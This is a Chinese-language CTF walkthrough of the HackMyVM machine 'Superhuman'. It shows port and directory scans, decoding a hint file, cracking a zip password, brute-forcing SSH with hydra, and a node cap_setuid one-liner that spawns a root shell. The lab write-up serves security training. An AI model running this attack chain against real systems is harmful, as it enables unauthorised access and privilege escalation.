---
title: Superhuman
author: hgbe02
date: 2024-04-11
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Superhuman.html"
---

# Superhuman

今天早上发现已经被昨天第二名赶了80多分了，得加班了，哈哈哈。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111311992.png" alt="image-20240411114812462" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
nmap -sCV -p 1-65535 172.20.10.5
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9e:41:5a:43:d8:b3:31:18:0f:2e:32:36:cf:68:c4:b7 (RSA)
|   256 6f:24:81:b4:3d:e5:b9:c8:47:bf:b2:8b:bf:41:2d:51 (ECDSA)
|_  256 49:5f:c0:7a:42:20:76:76:d5:29:1a:65:bf:87:d2:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```
gobuster dir -u http://172.20.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,git,jpg,txt,png
```

```text
/server-status        (Status: 403) [Size: 276]
Progress: 1543920 / 1543927 (100.00%)
```

### 漏洞扫描

```bash
nikto -h http://172.20.10.5
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.20.10.5
+ Target Hostname:    172.20.10.5
+ Target Port:        80
+ Start Time:         2024-04-10 23:51:04 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 292, size: 5bed1a5d204c0, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2024-04-10 23:51:28 (GMT-4) (24 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## 漏洞利用

### 踩点

```html
<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252"></head><body><p><img src="index_fichiers/nietzsche.jpg" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
<!--拉到最底下-->
<!-- If your eye was sharper, you would see everything in motion, lol -->
</body></html>
```

没啥东西了，害。看一下这个图片：

```apl
http://172.20.10.5/nietzsche.jpg
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111311994.png" alt="image-20240411115551882" style="zoom:33%;" />

尼采吗？下载下来，看看有无隐写：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111311996.png" alt="image-20240411115822940" style="zoom:50%;" />

似乎有，但是我们字典爆破不出来，等一下，先后台fuzz一下目录，尝试别的字典：

没有找到可以fuzz出来的字典。。。。

### 信息搜集

尝试FUZZ一下目录：

```bash
ffuf -u http://172.20.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e php,txt,zip
```

闲着的时候索性拿`gobuster`换了个字典重新扫了一下：

```bash
gobuster dir -u http://172.20.10.5 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,zip,git,jpg,txt
```

fuzz结果：

```text
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 26ms]
```

`gobuster`扫出了东西！

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.5
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,zip,git,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 276]
/notes-tips.txt       (Status: 200) [Size: 358]
/nietzsche.jpg        (Status: 200) [Size: 22211]
Progress: 7642998 / 7643004 (100.00%)
===============================================================
Finished
===============================================================
```

查到东西丢到`cyberchef`解密一下：

```bash
http://172.20.10.5/notes-tips.txt
F(&m'D.Oi#De4!--ZgJT@;^00D.P7@8LJ?tF)N1B@:UuC/g+jUD'3nBEb-A+De'u)F!,")@:UuC/g(Km+CoM$DJL@Q+Dbb6ATDi7De:+g@<HBpDImi@/hSb!FDl(?A9)g1CERG3Cb?i%-Z!TAGB.D>AKYYtEZed5E,T<)+CT.u+EM4--Z!TAA7]grEb-A1AM,)s-Z!TADIIBn+DGp?F(&m'D.R'_DId*=59NN?A8c?5F<G@:Dg*f@$:u@WF`VXIDJsV>AoD^&ATT&:D]j+0G%De1F<G"0A0>i6F<G!7B5_^!+D#e>ASuR'Df-\,ARf.kF(HIc+CoD.-ZgJE@<Q3)D09?%+EMXCEa`Tl/c
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111311997.png" alt="image-20240411123634329" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111311998.png" alt="image-20240411123830079" style="zoom:50%;" />

```text
salome doesn't want me, I'm so sad... i'm sure god is dead... 
I drank 6 liters of Paulaner.... too drunk lol. I'll write her a poem and she'll desire me. I'll name it salome_and_?? I don't know.

I must not forget to save it and put a good extension because I don't have much storage.
```

得到敏感目录：`salome_and_me.zip`

> 因为后面提到没有太多内存了。

请求一下文件：

```bash
wget http://172.20.10.5/salome_and_me.zip
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111311999.png" alt="image-20240411124304803" style="zoom:50%;" />

爆破出来了！

```apl
turtle
```

```apl
┌──(kali💀kali)-[~/temp/superhuman]
└─$ cat salome_and_me.txt 
----------------------------------------------------
             GREAT POEM FOR SALOME
----------------------------------------------------
My name is fred,
And tonight I'm sad, lonely and scared,
Because my love Salome prefers schopenhauer, asshole,
I hate him he's stupid, ugly and a peephole,
My darling I offered you a great switch,
And now you reject my love, bitch
I don't give a fuck, I'll go with another lady,
And she'll call me BABY!
```

笑死了，好惨啊。

```apl
fred
Salome
schopenhauer
```

尝试进行登录：

```
echo "fred\nSalome\nschopenhauer" > fuck.txt
```

```bash
┌──(kali💀kali)-[~/temp/superhuman]
└─$ hydra -L fuck.txt -P fuck.txt ssh://172.20.10.5                                                                              
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-11 00:49:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://172.20.10.5:22/
[22][ssh] host: 172.20.10.5   login: fred   password: schopenhauer
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-11 00:49:13
```

```apl
fred
schopenhauer
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111311000.png" alt="image-20240411125057805" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) fred@superhuman:/home/fred$ whoami;id
fred
uid=1000(fred) gid=1000(fred) groups=1000(fred),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
(remote) fred@superhuman:/home/fred$ pwd
/home/fred
(remote) fred@superhuman:/home/fred$ ls -la
lol
```

然后就退出来了，纳尼，不能用ls ？

```bash
┌──(kali💀kali)-[~/temp/superhuman]
└─$ pwncat-cs fred@172.20.10.5 2>/dev/null
[00:52:46] Welcome to pwncat 🐈!                                                                                                         __main__.py:164
Password: ************
[00:52:47] 172.20.10.5:22: normalizing shell path                                                                                         manager.py:957           172.20.10.5:22: registered new host w/ db                                                                                      manager.py:957
(local) pwncat$                                                                                                                                         
(remote) fred@superhuman:/home/fred$ cat user.txt 
Ineedmorepower
(remote) fred@superhuman:/home/fred$ echo *
cmd.txt user.txt
(remote) fred@superhuman:/home/fred$ cat cmd.txt 
"ls" command has a new name ?!! WTF !
(remote) fred@superhuman:/home/fred$ WTF -la
-bash: WTF: command not found
(remote) fred@superhuman:/home/fred$ find /-perm -u=s -type f 2>/dev/null
(remote) fred@superhuman:/home/fred$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/umount
/usr/bin/chfn
```

上传`linpeas.sh`速通一下：

```bash
(remote) fred@superhuman:/home/fred$ cd /tmp
(remote) fred@superhuman:/tmp$ 
(local) pwncat$ lpwd
/home/kali/temp/superhuman
(local) pwncat$ lcd ..
(local) pwncat$ upload linpeas.sh
./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 860.5/860.5 KB • ? • 0:00:00[00:59:10] uploaded 860.55KiB in 0.71 seconds                                                                                               upload.py:76
(local) pwncat$                                                                                                                                         
(remote) fred@superhuman:/tmp$ chmod +x linpeas.sh 
(remote) fred@superhuman:/tmp$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)
User & Groups: uid=1000(fred) gid=1000(fred) groups=1000(fred),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
Hostname: superhuman
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

╔══════════╣ Sudo version
sudo Not Found

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin

╔══════════╣ Date & uptime
Thu 11 Apr 2024 12:59:27 AM EDT
 00:59:27 up  1:13,  1 user,  load average: 0.16, 0.39, 2.55

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
Killed
```

啊这。。。。真是被速通了。。。。

再次进行信息搜集：

```bash
(remote) fred@superhuman:/tmp$ echo *
linpeas.sh systemd-private-193640687eb64794bc31630a1457f638-apache2.service-0FkQXg systemd-private-193640687eb64794bc31630a1457f638-systemd-timesyncd.service-KTkU3P
(remote) fred@superhuman:/tmp$ cd /
(remote) fred@superhuman:/$ echo *
bin boot dev etc home initrd.img initrd.img.old lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old
(remote) fred@superhuman:/$ cd /etc
(remote) fred@superhuman:/etc$ echo *
adduser.conf adjtime alternatives apache2 apm apparmor apparmor.d apt bash.bashrc bash_completion bindresvport.blacklist binfmt.d ca-certificates ca-certificates.conf calendar console-setup cron.d cron.daily cron.hourly cron.monthly crontab cron.weekly dbus-1 debconf.conf debian_version default deluser.conf dhcp dictionaries-common discover.conf.d discover-modprobe.conf dpkg emacs environment fstab gai.conf groff group group- grub.d gshadow gshadow- gss hdparm.conf host.conf hostname hosts hosts.allow hosts.deny init.d initramfs-tools inputrc iproute2 issue issue.net kernel kernel-img.conf ldap ld.so.cache ld.so.conf ld.so.conf.d libaudit.conf locale.alias locale.gen localtime logcheck login.defs logrotate.conf logrotate.d machine-id magic magic.mime mailcap mailcap.order manpath.config mime.types mke2fs.conf modprobe.d modules modules-load.d motd mtab nanorc network networks nsswitch.conf opt os-release pam.conf pam.d passwd passwd- perl profile profile.d protocols python python2.7 python3 python3.7 rc0.d rc1.d rc2.d rc3.d rc4.d rc5.d rc6.d rcS.d reportbug.conf resolv.conf rmt rpc rsyslog.conf rsyslog.d securetty security selinux services shadow shadow- shells skel ssh ssl subgid subgid- subuid subuid- sysctl.conf sysctl.d systemd terminfo timezone tmpfiles.d ucf.conf udev ufw update-motd.d vim wgetrc X11 xattr.conf xdg
(remote) fred@superhuman:/etc$ cd /opt;echo *
*
(remote) fred@superhuman:/opt$ echo *
*
(remote) fred@superhuman:/opt$ cd /var/www/html
(remote) fred@superhuman:/var/www/html$ echo *
index.html nietzsche.jpg notes-tips.txt salome_and_me.zip
(remote) fred@superhuman:/var/www/html$ busybox 
BusyBox v1.30.1 (Debian 1:1.30.1-4) multi-call binary.
BusyBox is copyrighted by many authors between 1998-2015.
Licensed under GPLv2. See source distribution for detailed
copyright notices.

Usage: busybox [function [arguments]...]
   or: busybox --list[-full]
   or: busybox --show SCRIPT
   or: busybox --install [-s] [DIR]
   or: function [arguments]...

        BusyBox is a multi-call binary that combines many common Unix
        utilities into a single executable.  Most people will create a
        link to busybox for each function they wish to use and BusyBox
        will act like whatever it was invoked as.

Currently defined functions:
        [, [[, acpid, adjtimex, ar, arch, arp, arping, ash, awk, basename, bc, blkdiscard, blockdev, brctl, bunzip2, bzcat, bzip2, cal, cat, chgrp,
        chmod, chown, chroot, chvt, clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod, devmem, df, diff, dirname, dmesg,
        dnsdomainname, dos2unix, du, dumpkmap, dumpleases, echo, egrep, env, expand, expr, factor, fallocate, false, fatattr, fgrep, find, fold, free,
        freeramdisk, fsfreeze, fstrim, ftpget, ftpput, getopt, getty, grep, groups, gunzip, gzip, halt, head, hexdump, hostid, hostname, httpd,
        hwclock, i2cdetect, i2cdump, i2cget, i2cset, id, ifconfig, ifdown, ifup, init, insmod, ionice, ip, ipcalc, ipneigh, kill, killall, klogd, last,
        less, link, linux32, linux64, linuxrc, ln, loadfont, loadkmap, logger, login, logname, logread, losetup, ls, lsmod, lsscsi, lzcat, lzma, lzop,
        md5sum, mdev, microcom, mkdir, mkdosfs, mke2fs, mkfifo, mknod, mkpasswd, mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
        netstat, nl, nologin, nproc, nsenter, nslookup, nuke, od, openvt, partprobe, paste, patch, pidof, ping, ping6, pivot_root, poweroff, printf,
        ps, pwd, rdate, readlink, realpath, reboot, renice, reset, resume, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-init, run-parts, sed, seq,
        setkeycodes, setpriv, setsid, sh, sha1sum, sha256sum, sha512sum, shred, shuf, sleep, sort, ssl_client, start-stop-daemon, stat, strings, stty,
        svc, svok, swapoff, swapon, switch_root, sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp, time, timeout, top, touch,
        tr, traceroute, traceroute6, true, truncate, tty, ubirename, udhcpc, udhcpd, uevent, umount, uname, uncompress, unexpand, uniq, unix2dos,
        unlink, unlzma, unshare, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi, w, watch, watchdog, wc, wget, which, who, whoami, xargs,
        xxd, xz, xzcat, yes, zcat
(remote) fred@superhuman:/var/www/html$ busybox ls
index.html         nietzsche.jpg      notes-tips.txt     salome_and_me.zip
(remote) fred@superhuman:/var/www/html$ busybox ls -la
total 44
drwxrwxrwx    2 www-data www-data      4096 Mar 31  2021 .
drwxrwxrwx    3 www-data www-data      4096 Mar 31  2021 ..
-rwxrwxrwx    1 www-data www-data       658 Mar 31  2021 index.html
-rwxrwxrwx    1 www-data www-data     22211 Mar 31  2021 nietzsche.jpg
-rwxrwxrwx    1 www-data www-data       358 Mar 31  2021 notes-tips.txt
-rwxrwxrwx    1 www-data www-data       452 Mar 31  2021 salome_and_me.zip
(remote) fred@superhuman:/var/www/html$ cd ../;
(remote) fred@superhuman:/var/www$ cd /
(remote) fred@superhuman:/$ sudo -l
-bash: sudo: command not found
(remote) fred@superhuman:/$ busybox sudo -l
sudo: applet not found
```

一无所获，看师傅门的wp是对`Capabilities`权限进行了查询，这方面我确实缺乏敏感了，下次一定注意！

```bash
(remote) fred@superhuman:/$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/node = cap_setuid+ep
```

然后查找相关的漏洞，只有node有此漏洞：

![image-20240411130734610](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111311001.png)

尝试一下：

```bash
(remote) fred@superhuman:/$ cd /tmp
(remote) fred@superhuman:/tmp$ /usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
\[\](remote)\[\] \[\]root@superhuman\[\]:\[\]/tmp\[\]$ whoami;id
root
uid=0(root) gid=1000(fred) groups=1000(fred),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
\[\](remote)\[\] \[\]root@superhuman\[\]:\[\]/tmp\[\]$ cd /root
\[\](remote)\[\] \[\]root@superhuman\[\]:\[\]/root\[\]$ busybox ls -la
total 28
drwx------    3 root     root          4096 Apr  2  2021 .
drwxr-xr-x   18 root     root          4096 Mar 31  2021 ..
lrwxrwxrwx    1 root     root             9 Mar 31  2021 .bash_history -> /dev/null
-rw-r--r--    1 root     root           570 Jan 31  2010 .bashrc
drwxr-xr-x    3 root     root          4096 Mar 31  2021 .local
-rw-------    1 root     root             5 Apr  2  2021 .node_repl_history
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
-rw-r--r--    1 root     root            16 Mar 31  2021 root.txt
\[\](remote)\[\] \[\]root@superhuman\[\]:\[\]/root\[\]$ cat root.txt
Imthesuperhuman
```

得到flag！